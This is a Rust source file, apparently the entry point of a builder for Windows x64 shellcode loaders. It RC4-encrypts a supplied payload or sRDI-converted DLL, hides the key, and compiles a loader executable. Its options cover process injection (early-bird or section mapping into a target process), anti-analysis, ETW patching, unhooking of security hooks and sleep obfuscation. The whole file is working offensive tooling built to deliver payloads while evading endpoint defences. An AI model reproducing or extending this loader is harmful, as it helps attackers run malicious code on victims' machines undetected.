mod codegen;
mod compiler;
mod config;
mod crypto;

use codegen::{write_config_h, write_payload_c};
use compiler::compile;
use config::{usage, BuildConfig};
use crypto::{obfuscate_key, rand_bytes, rc4, KEY_SZ};

use std::{
    fs,
    path::{Path, PathBuf},
    process::Command,
    time::{SystemTime, UNIX_EPOCH},
};

// ── Minimal RAII temp-dir (no external crates) ────────────────────────────────

struct TempDir(PathBuf);

impl TempDir {
    fn new(prefix: &str) -> std::io::Result<Self> {
        let ts = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(42);
        let dir = std::env::temp_dir().join(format!("{prefix}_{:x}_{}", std::process::id(), ts));
        fs::create_dir(&dir)?;
        Ok(Self(dir))
    }
    fn path(&self) -> &Path { &self.0 }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

fn exe_dir() -> PathBuf {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .unwrap_or_else(|| PathBuf::from("."))
}

/// Walk from `start` up the directory tree to find a dir containing `src/HellAsm.s`.
/// Falls back to `start/src` if nothing is found (deployed layout).
fn find_project_root(start: &Path) -> PathBuf {
    let mut dir = start.to_path_buf();
    loop {
        if dir.join("src").join("HellAsm.s").exists() {
            return dir;
        }
        match dir.parent() {
            Some(p) => dir = p.to_path_buf(),
            None    => break,
        }
    }
    start.to_path_buf()
}

fn safe_name(s: &str) -> bool {
    !s.chars().any(|c| matches!(c, '"' | '\'' | '`' | '$' | ';' | '&' | '|' | '/' | '\\' | '\n' | '\r'))
}

// ── Entry point ───────────────────────────────────────────────────────────────

fn main() {
    std::process::exit(run());
}

fn run() -> i32 {
    let args: Vec<String> = std::env::args().collect();
    let prog = args.first().map(String::as_str).unwrap_or("build");

    let mut payload_arg: Option<PathBuf> = None;
    let mut dll_arg:     Option<PathBuf> = None;
    let mut out_name:    Option<String>  = None;
    let mut target:      Option<String>  = None;
    let mut spawn:       Option<String>  = None;
    let mut early_bird  = false;
    let mut aa          = true;
    let mut debug       = false;
    let mut etw_patch   = false;
    let mut unhook      = false;
    let mut sleep_obf   = false;
    let mut sleep_ms:  u32 = 10000;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--payload"   => { i += 1; payload_arg = Some(PathBuf::from(&args[i])); }
            "--dll"       => { i += 1; dll_arg     = Some(PathBuf::from(&args[i])); }
            "--target"    => { i += 1; target      = Some(args[i].clone()); }
            "--out"       => { i += 1; out_name    = Some(args[i].clone()); }
            "--spawn"     => { i += 1; spawn       = Some(args[i].clone()); }
            "--inject"    => {
                i += 1;
                match args[i].as_str() {
                    "early-bird" => early_bird = true,
                    "mapping"    => {}
                    m => { eprintln!("[!] unknown inject method: {m}"); return 1; }
                }
            }
            "--sleep-ms"  => { i += 1; sleep_ms    = args[i].parse().unwrap_or(10000); }
            "--no-aa"     => aa         = false,
            "--debug"     => debug      = true,
            "--etw-patch" => etw_patch  = true,
            "--unhook"    => unhook     = true,
            "--sleep-obf" => sleep_obf  = true,
            a => { eprintln!("unknown arg: {a}"); usage(prog); return 1; }
        }
        i += 1;
    }

    if payload_arg.is_none() && dll_arg.is_none() { usage(prog); return 1; }
    if payload_arg.is_some() && dll_arg.is_some() {
        eprintln!("[!] --payload and --dll are mutually exclusive");
        return 1;
    }
    if let Some(ref t) = target  { if !safe_name(t) { eprintln!("[!] invalid --target"); return 1; } }
    if let Some(ref o) = out_name { if !safe_name(o) { eprintln!("[!] invalid --out");   return 1; } }

    let self_dir = find_project_root(&exe_dir());

    // ── sRDI conversion if --dll ──────────────────────────────────────────────
    // Keep the TempDir alive for the entire remainder of main.
    let _srdi_tmp: Option<TempDir>;
    let payload_path: PathBuf;

    if let Some(ref dll) = dll_arg {
        let srdi_builder = self_dir.join("tools/sRDI_builder");
        let refl_loader  = self_dir.join("tools/reflective_loader.dll");
        if !srdi_builder.exists() || !refl_loader.exists() {
            eprintln!(
                "[!] sRDI tools not found.\n    Expected: {}\n              {}\n    Build with: {}/tools/setup_srdi.sh",
                srdi_builder.display(), refl_loader.display(), self_dir.display()
            );
            return 1;
        }
        let tmp = match TempDir::new("hf_srdi") {
            Ok(d)  => d,
            Err(e) => { eprintln!("[!] mkdtemp failed: {e}"); return 1; }
        };
        let out_bin = tmp.path().join("srdi.bin");
        let status = Command::new(&srdi_builder)
            .args(["--loader",  refl_loader.to_str().unwrap_or(""),
                   "--payload", dll.to_str().unwrap_or(""),
                   "--output",  out_bin.to_str().unwrap_or("")])
            .status();
        match status {
            Ok(s) if s.success() => {}
            Ok(_)  => { eprintln!("[!] sRDI conversion failed"); return 1; }
            Err(e) => { eprintln!("[!] sRDI builder exec failed: {e}"); return 1; }
        }
        payload_path = out_bin;
        _srdi_tmp    = Some(tmp);
    } else {
        payload_path = payload_arg.unwrap();
        _srdi_tmp    = None;
    }

    // ── Read shellcode ────────────────────────────────────────────────────────
    let shellcode = match fs::read(&payload_path) {
        Ok(b) => b,
        Err(e) => { eprintln!("[!] {}: {e}", payload_path.display()); return 1; }
    };
    if shellcode.is_empty() || shellcode.len() > 8 * 1024 * 1024 {
        eprintln!("[!] payload size out of range ({})", shellcode.len());
        return 1;
    }

    // ── Encrypt ───────────────────────────────────────────────────────────────
    let mut key = [0u8; KEY_SZ];
    rand_bytes(&mut key);
    let (enc_key, hint) = obfuscate_key(&key);
    let mut ct = shellcode;
    rc4(&key, &mut ct);

    // ── Summary ───────────────────────────────────────────────────────────────
    println!("[*] Output       : Windows x64 PE (.exe) — Linux/macOS payloads not supported");
    println!("[+] Payload      : {} bytes  ({})", ct.len(), payload_path.display());
    print!("[+] RC4 key      : ");
    for b in &key { print!("{b:02X}"); }
    println!();
    println!("[+] Hint byte    : 0x{hint:02X}");
    println!("[+] Target       : {}", target.as_deref().unwrap_or("self (local)"));
    println!("[+] Inject       : {}", if early_bird { "early-bird" } else { "mapping" });
    println!("[+] Anti-analysis: {}", if aa        { "on" } else { "off" });
    println!("[+] Debug        : {}", if debug     { "on" } else { "off" });
    println!("[+] ETW patch    : {}", if etw_patch { "on" } else { "off" });
    println!("[+] Unhook       : {}", if unhook    { "on" } else { "off" });
    println!("[+] Sleep obf    : {}", if sleep_obf { "on" } else { "off" });

    // ── Build ─────────────────────────────────────────────────────────────────
    let cfg = BuildConfig {
        target, spawn, early_bird, aa, debug, etw_patch, unhook, sleep_obf, sleep_ms,
        out_name: out_name.clone(),
    };

    let src_dir = self_dir.join("src");
    let out_dir = self_dir.join("output");
    if let Err(e) = fs::create_dir_all(&out_dir) {
        eprintln!("[!] cannot create output dir: {e}"); return 1;
    }

    let out_path = if let Some(ref n) = cfg.out_name {
        out_dir.join(format!("{n}.exe"))
    } else {
        let ts = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        out_dir.join(format!("loader_{ts}.exe"))
    };

    let build_tmp = match TempDir::new("hf_build") {
        Ok(d)  => d,
        Err(e) => { eprintln!("[!] mkdtemp failed: {e}"); return 1; }
    };

    if let Err(e) = write_config_h(build_tmp.path(), hint, ct.len(), &cfg) {
        eprintln!("[!] write_config_h failed: {e}"); return 1;
    }
    if let Err(e) = write_payload_c(build_tmp.path(), &ct, &enc_key, &cfg) {
        eprintln!("[!] write_payload_c failed: {e}"); return 1;
    }

    println!("[+] Compiling...");
    match compile(&src_dir, build_tmp.path(), &out_path, &cfg) {
        Ok(()) => {
            let sz = fs::metadata(&out_path).map(|m| m.len()).unwrap_or(0);
            println!("[+] Done         : {}  ({}K)", out_path.display(), sz / 1024);
            0
        }
        Err(e) => {
            eprintln!("[!] Build failed: {e}");
            1
        }
    }
}
